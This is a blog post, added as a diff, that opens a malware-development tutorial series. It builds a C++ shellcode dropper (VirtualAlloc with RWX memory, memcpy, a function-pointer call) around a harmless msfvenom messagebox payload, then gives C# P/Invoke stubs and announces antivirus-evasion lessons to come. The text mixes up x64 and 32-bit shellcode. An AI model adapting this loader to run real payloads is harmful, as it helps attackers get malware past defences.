@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html class="no-js" lang="pt-br">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>MalDev - 0x00 | RSI</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="stylesheet" href="/blog/css/bundle.css">
+	<link rel="icon" href="/blog/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/blog/icons/32.png" sizes="32x32" type="image/png">
+		
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/blog">RSI</a>
+	
+<nav class="main-nav" role="navigation">
+	<button id="toggle" class="main-nav__btn" aria-label="Menu toggle" aria-expanded="false" tabindex="0">
+		<div class="main-nav__btn-box" tabindex="-1">
+			<svg class="main-nav__icon icon-menu" width="18" height="18" viewBox="0 0 18 18">
+				<path class="icon-menu__burger" d="M18 0v3.6H0V0h18zM0 10.8h18V7.2H0v3.6zM0 18h18v-3.6H0V18z"/>
+				<path class="icon-menu__x" d="M11.55 9L18 15.45 15.45 18 9 11.55 2.55 18 0 15.45 6.45 9 0 2.55 2.55 0 9 6.45 15.45 0 18 2.55 11.55 9z"/>
+			</svg>
+		</div>
+	</button>
+	<ul id="menu" class="main-nav__list">
+			<li class="main-nav__item">
+				<a class="main-nav__link" href="/blog/authors/">
+					
+					<span class="main-nav__text">Autores</span>
+					
+				</a>
+			</li>
+			<li class="main-nav__item">
+				<a class="main-nav__link" href="/blog/tags/">
+					
+					<span class="main-nav__text">Tags</span>
+					
+				</a>
+			</li>
+			<li class="main-nav__item main-nav__item--active">
+				
+					
+					<span class="main-nav__text">Posts</span>
+					
+				
+			</li>
+	</ul>
+</nav>
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">MalDev - 0x00</h1>
+				<div class="entry__content"><blockquote>
+<p><em>Por Igor Benevides</em></p>
+</blockquote>
+<h2 id="introduction">Introduction</h2>
+<p>Hello! My name is Igor and I&rsquo;m a professional cybersecurity consultant and researcher. I currently own OSEP certification, and I&rsquo;m going through OSED. I love to study about cybersecurity and I&rsquo;m a part of the RSI (Residência da Segurança da Informação) project, which is an extension project for UFC (Universidade Federal do Ceará). The goal of this new series is to teach malware development for anyone interested in this theme. I&rsquo;ll provide a simple and easy to follow series of blogs to study from the very basic to the state of the art in malware development.</p>
+<h2 id="the-journey">The Journey</h2>
+<h3 id="pre-requisites">Pre-requisites</h3>
+<ul>
+<li>Programming</li>
+<li>C/C++/C#</li>
+<li>Some basic concepts about Operating Systems</li>
+</ul>
+<h3 id="what-will-be-covered-in-due-time">What will be covered (In due time)</h3>
+<ul>
+<li>Dropper creation</li>
+<li>Bypassing Av</li>
+<li>Process injection techniques</li>
+<li>Advanced Evasion tecniques</li>
+<li>Modern EDR bypasses</li>
+</ul>
+<h3 id="what-will-not-be-covered">What will not be covered</h3>
+<ul>
+<li>Teaching C/C++/C#</li>
+<li>Teaching shellcode creation</li>
+<li>How to weaponize these malware</li>
+</ul>
+<h2 id="creating-a-basic-dropper-c">Creating a basic dropper (C++)</h2>
+<p>So let&rsquo;s start by creating a basic dropper, but what&rsquo;s a dropper? You might ask, A dropper is simply a shell of the malware. In this series, all you&rsquo;ll learn is how to create different droppers, not weaponized malware. My goal with this series is not to deliver powerful bombs to inexperienced people, but instead make analysts aware of the presented techniques and give insights on how to prepare for them.</p>
+<h3 id="setting-up-the-enviroment">Setting up the enviroment</h3>
+<p>I&rsquo;d recommend you setup in a VM since we&rsquo;ll be deactivating our anti-virus on these first topics.</p>
+<ul>
+<li><a href="https://visualstudio.microsoft.com/pt-br/downloads/">Download Visual Studio</a> (Any relatively new version should work)</li>
+<li>Open Visual Studio</li>
+<li>Create a Project</li>
+</ul>
+<p><img src="images/7290d411581bee18f806d87da3a08c84.png" alt="7290d411581bee18f806d87da3a08c84.png"></p>
+<ul>
+<li>Type Console in search bar, select C++ as a language</li>
+</ul>
+<p><img src="images/cc316c299f09262e414d03312dd3fa19.png" alt="cc316c299f09262e414d03312dd3fa19.png"></p>
+<ul>
+<li>Select a name for your project</li>
+</ul>
+<p><img src="images/4668187bcde20dc020a774db665cdcbc.png" alt="4668187bcde20dc020a774db665cdcbc.png"></p>
+<ul>
+<li>Once you get this code on your screen, you&rsquo;re good to go!</li>
+</ul>
+<p><img src="images/76f42392f3e94193c9fcbbce7b6c03ea.png" alt="76f42392f3e94193c9fcbbce7b6c03ea.png"></p>
+<h3 id="compiling-and-running">Compiling and running</h3>
+<ul>
+<li>Select x86 or x64 depending on your VM architeture</li>
+</ul>
+<p><img src="images/f7c7dcfef8536c4709ed78201cc252b0.png" alt="f7c7dcfef8536c4709ed78201cc252b0.png"></p>
+<ul>
+<li>Compile your solution clicking on Compilation tab and then, Compile Solution</li>
+</ul>
+<p><img src="images/ad6fa775775c2e80a2ff75ad218d3af0.png" alt="ad6fa775775c2e80a2ff75ad218d3af0.png"></p>
+<ul>
+<li>Watch out for any errors or warnings here</li>
+</ul>
+<p><img src="images/4597e75a7e27d7efb44939cea1ae978e.png" alt="4597e75a7e27d7efb44939cea1ae978e.png"></p>
+<ul>
+<li>Open cmd, cd to exe directory, and run it</li>
+</ul>
+<p><img src="images/aca5a73d9114a92ee561fc223fad8692.png" alt="aca5a73d9114a92ee561fc223fad8692.png"></p>
+<p>Only move forward after you got Hello World!</p>
+<h3 id="coding-the-dropper-createthread">Coding the dropper (CreateThread)</h3>
+<p>This will be the simpler of all the droppers, this will work as a foundation for the next blog posts. The idea is super simple, load a hardcoded shellcode in memory, allocate it in memory so we can get a pointer to it, execute the shellcode at the allocated address! Super simple, the code will be very small.</p>
+<h4 id="1-hardcode-a-shellcode-in-memory">1. Hardcode a shellcode in memory</h4>
+<p>For this demo, let&rsquo;s create a messagebox from msfvenom, this code is flagged as malicious by basically every AV but it isn&rsquo;t dangerous. Perfect for our porpousers. You can use your kali machine or install in any linux machine with
+<code>sudo apt-get metasploit-framework</code></p>
+<ul>
+<li>Run the following command:
+<code>msfvenom -p windows/x64/messagebox -f c TEXT=&quot;Hello, from malware :D&quot; TITLE=&quot;Malware&quot;</code>
+<img src="images/f14f10d8a931e9bc46bf60e9b0edd0f1.png" alt="f14f10d8a931e9bc46bf60e9b0edd0f1.png"></li>
+</ul>
+<p>PS: This command creates a shellcode in c format, that is the same for cpp, the shellcode executes a messagebox using windows functions for a 64bit machine</p>
+<ul>
+<li>Now just copy and paste the shellcode to our main function</li>
+</ul>
+<p>-<img src="images/d4390c0bebb6b8a953ebeab303f28f59.png" alt="d4390c0bebb6b8a953ebeab303f28f59.png"></p>
+<h4 id="2-allocating-an-address-for-the-shellcode">2. Allocating an address for the shellcode</h4>
+<ul>
+<li>add <code>#include &lt;windows.h&gt;</code> to the import section
+<img src="images/5d09c9a25aef44cbdf8fac4355866c9a.png" alt="5d09c9a25aef44cbdf8fac4355866c9a.png"></li>
+<li>call VirtualAlloc in a void pointer address with the following snippet</li>
+</ul>
+<pre tabindex="0"><code>// Shellcode Allocation
+void* allocatedFunctionAddress = VirtualAlloc(NULL, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+// Check for errors in the allocation proccess
+if (allocatedFunctionAddress == NULL) {
+	DWORD error = GetLastError();
+	std::cerr &lt;&lt; &#34;VirtualAlloc failed with error code: &#34; &lt;&lt; error &lt;&lt; std::endl;
+	return 1;
+}
+</code></pre><p>VirtualAlloc recieves 4 arguments, the first one is optional and refers to the initial address of the allocation, since we don&rsquo;t really care about that we set it to NULL. The second argument is the size of the allocated region, we just need to get the size of the buf variable. The third is the allocation type parameter, MEM_COMMIT variable is used to automatically reserve a virtual memory page and zero it content. The fourth one is the memory protection type that we want for our page, in this case we use PAGE_EXECUTE_READWRITE, because we need to write our shellcode, read and execute it. For a more detailed explanation and other memory allocations types refer to <a href="https://learn.microsoft.com/pt-br/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">this section of the microsoft documentation</a>.
+If the returned address is NULL, something went wrong, for debugging porpouses we get the error code with the GetLastError function</p>
+<h4 id="3-copying-buf-content">3. Copying buf content</h4>
+<p>This one is pretty straightforward, just copy the contents of buf variable into the allocated address.</p>
+<pre tabindex="0"><code>// Copy the content of buf to the new address
+memcpy(allocatedFunctionAddress, buf, sizeof buf);
+</code></pre><p>For more information, as always, <a href="https://learn.microsoft.com/pt-br/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170">refer to the docs</a></p>
+<h4 id="4-execute-the-shellcode">4. Execute the shellcode</h4>
+<p>For executing our code, we can use some C/C++ magic to type cast our allocated address as a function pointer and just call it as a normal function. The steps here are more intuitive I think, you&rsquo;ll see in the internet some oneliners that&rsquo;ll do the same, but here I&rsquo;ll break it down in a more &ldquo;clean code&rdquo; manner.</p>
+<pre tabindex="0"><code>// Create a type for our shellcode function, we&#39;ll expect a int to return
+typedef int (*BufFunction)();
+// Convert to function pointer
+BufFunction bufF = reinterpret_cast&lt;BufFunction&gt;(allocatedFunctionAddress);
+// Call the function and print the result
+int result = bufF();
+std::cout &lt;&lt; &#34;Result: &#34; &lt;&lt; result &lt;&lt; std::endl;
+</code></pre><h4 id="5-wrapping-it-up">5. Wrapping it Up</h4>
+<p>So here&rsquo;s the full code, let&rsquo;s walkthrough the proccess: create your shellcode (that&rsquo;s the actual malware), allocate some memory for it, mark it as readable, writeable and executable. Finally, copy the shellcode to the allocated memory and typecast it to a function pointer and call it. If you compiled correctly and disabled your antivirus you should be able to execute the code and get a message box that says: Hello, from malware! (This is 32-bit shellcode)</p>
+<pre tabindex="0"><code>// Create_Thread_CPP.cpp : Este arquivo contém a função &#39;main&#39;. A execução do programa começa e termina ali.
+//
+
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+
+int main()
+{
+    unsigned char buf[] =
+        &#34;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64&#34;
+        &#34;\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e&#34;
+        &#34;\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60&#34;
+        &#34;\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b&#34;
+        &#34;\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01&#34;
+        &#34;\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d&#34;
+        &#34;\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01&#34;
+        &#34;\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01&#34;
+        &#34;\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89&#34;
+        &#34;\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45&#34;
+        &#34;\x04\xbb\xef\xce\xe0\x60\x87\x1c\x24\x52\xe8\x8e\xff\xff&#34;
+        &#34;\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64&#34;
+        &#34;\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56&#34;
+        &#34;\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24&#34;
+        &#34;\x52\xe8\x5f\xff\xff\xff\x68\x61\x72\x65\x58\x68\x4d\x61&#34;
+        &#34;\x6c\x77\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68\x58\x20\x20&#34;
+        &#34;\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20\x68\x6f\x2c&#34;
+        &#34;\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89&#34;
+        &#34;\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55&#34;
+        &#34;\x08&#34;;
+
+
+    // Shellcode Allocation
+    void* allocatedFunctionAddress = VirtualAlloc(NULL, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    // Check for errors in the allocation proccess
+    if (allocatedFunctionAddress == NULL) {
+        DWORD error = GetLastError();
+        std::cerr &lt;&lt; &#34;VirtualAlloc failed with error code: &#34; &lt;&lt; error &lt;&lt; std::endl;
+        return 1;
+    }
+    std::cout &lt;&lt; &#34;Allocated Address at 0x&#34; &lt;&lt; allocatedFunctionAddress &lt;&lt; std::endl;
+
+    // Copy the content of buf to the new address
+    memcpy(allocatedFunctionAddress, buf, sizeof buf);
+    std::cout &lt;&lt; &#34;Copied Shellcode!&#34; &lt;&lt; std::endl;
+    std::cout &lt;&lt; &#34;Executing Shellcode...&#34; &lt;&lt; std::endl;
+
+    // Create a type for our shellcode function, we&#39;ll expect a int to return
+    typedef void (*BufFunction)();
+    // Convert to function pointer
+    BufFunction bufF = reinterpret_cast&lt;BufFunction&gt;(allocatedFunctionAddress);
+    // Call the function
+    bufF();
+    return 0;
+}
+</code></pre><h2 id="what-if-i-want-c">What if I want C#?</h2>
+<p>For some reason, you want to code this in C# (in latter articles we&rsquo;ll see why, in some cases, this is interesting)</p>
+<h3 id="straight-to-the-dropper">Straight to the dropper</h3>
+<p>As you&rsquo;ve learned above, set up your new C# project as a console application aswell. Should be fairly simple if you understood the C++ part. I&rsquo;ll mainly point out the differences and how to translate the same C++ code to C#.</p>
+<h4 id="attention-be-careful-not-to-create-a-runtime-project-but-a-net-framework-the-difference-is-that-the-net-framework-one-only-works-in-windows-thats-the-one-well-cover-this-article-in-the-future-well-show-the-advantages-and-disadvantages-of-using-the-runtime-of-net-core">Attention, be careful not to create a Runtime project, but a .NET Framework the difference is that the .NET framework one only works in Windows, that&rsquo;s the one we&rsquo;ll cover this article. In the future we&rsquo;ll show the advantages and disadvantages of using the Runtime of .NET Core</h4>
+<p><img src="images/50ede6a2fdaa31e1ab1aa0b3fb2155b8.png" alt="50ede6a2fdaa31e1ab1aa0b3fb2155b8.png"></p>
+<h3 id="calling-win32-functions-from-c">Calling Win32 functions from C#</h3>
+<p>This is the main part, covering this should be enough for you to come up with a working code. You&rsquo;ll need to import this library <code>using System.Runtime.InteropServices;</code> that will allow you to import kernel32.dll functions (which refers to the functions in windows.h, some of them at least).
+After importing, we can call external exports from windows dlls like this:</p>
+<pre tabindex="0"><code>[System.Runtime.InteropServices.DllImport(&#34;kernel32&#34;)]
+private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);
+[System.Runtime.InteropServices.DllImport(&#34;kernel32&#34;)]
+private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);
+[DllImport(&#34;kernel32.dll&#34;)]
+static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+</code></pre><p>We only need these three for our dropper.</p>
+<p>So, virtual alloc is already covered, let&rsquo;s cover the other win32 functions then.</p>
+<p>The <strong>CreateThread</strong> function is a fundamental building block for multithreaded applications. It is part of the Windows API and is typically used to spawn a new thread within a process. We&rsquo;re going to need this function to execute our shellcode in a separate thread. Here&rsquo;s a breakdown of its key parameters:</p>
+<ul>
+<li><strong>lpThreadAttributes</strong>: A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes.</li>
+<li><strong>dwStackSize</strong>: The initial size of the stack, in bytes, for the new thread. If this parameter is zero, the new thread uses the default stack size.</li>
+<li><strong>lpStartAddress</strong>: A pointer to the application-defined function that the new thread will execute.</li>
+<li><strong>param</strong>: A pointer to a variable to be passed to the thread function.</li>
+<li><strong>dwCreationFlags:</strong> Flags that control the creation of the thread.</li>
+<li><strong>lpThreadId:</strong> A pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned.</li>
+</ul>
+<p>The <strong>WaitForSingleObject</strong> function is crucial for synchronization in multithreaded applications. It enables a thread to wait until the specified object is in the signaled state. Think of it as an await for async programming. Here&rsquo;s the breakdown of the parameters:</p>
+<p><strong>hHandle:</strong> A handle to the object. This can be a handle to a thread, process, or other types of objects.</p>
+<p><strong>dwMilliseconds</strong>: The time-out interval, in milliseconds. If a nonzero value is specified, the function waits until the object is signaled or the time-out interval elapses.</p>
+<p>You should be able to comeup with a code yourself from this point, I highly recommend you start practicing your coding skills if you want to be successfull in malware development, since the public source codes get detected really easily with time. Probably even the ones that&rsquo;ll show you in the next articles that bypass some security defenses will be obsolete in a few years, but if you manage to grasp the knowledge provided here you should be able to create your own malware in due time.</p>
+<h2 id="repos">Repos</h2>
+<p>For your easy copy and paste :), but also for any malware analystis out there looking to hone their skills and understand how these malicious processes behave, I&rsquo;m creating a repository for each dropper:
+<a href="https://github.com/igor4020/MaldevCreateThreadCPP">github source code for C++ dropper</a>,
+<a href="https://github.com/igor4020/MalDevCreateThreadCSharp">github source code for C# dropper</a>
+copy and start it if it helped you on your studies. Thank you and stay tuned for the next post: <strong>We&rsquo;ll go through how to evade Anti-Viruses (covering some techiniques from PEN-300  offsec course)</strong></p>
+</div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/blog/tags/windows/">windows</a>
+			<a class="entry__tag btn" href="/blog/tags/c&#43;&#43;/">c&#43;&#43;</a>
+			<a class="entry__tag btn" href="/blog/tags/win32/">win32</a>
+			<a class="entry__tag btn" href="/blog/tags/winapi/">winapi</a>
+			<a class="entry__tag btn" href="/blog/tags/malware/">malware</a>
+			<a class="entry__tag btn" href="/blog/tags/maldev/">maldev</a>
+			<a class="entry__tag btn" href="/blog/tags/programming/">programming</a>
+			<a class="entry__tag btn" href="/blog/tags/lowlevel/">lowlevel</a>
+			<a class="entry__tag btn" href="/blog/tags/operating-systems/">operating systems</a>
+</div>
+					
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+	
+
+
+
+	
+
+	</div>
+	<footer class="footer">
+	<div class="footer__copyright">© 2024 RSI. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+<script src="/blog/js/menu.js"></script>
+</body>
+</html>
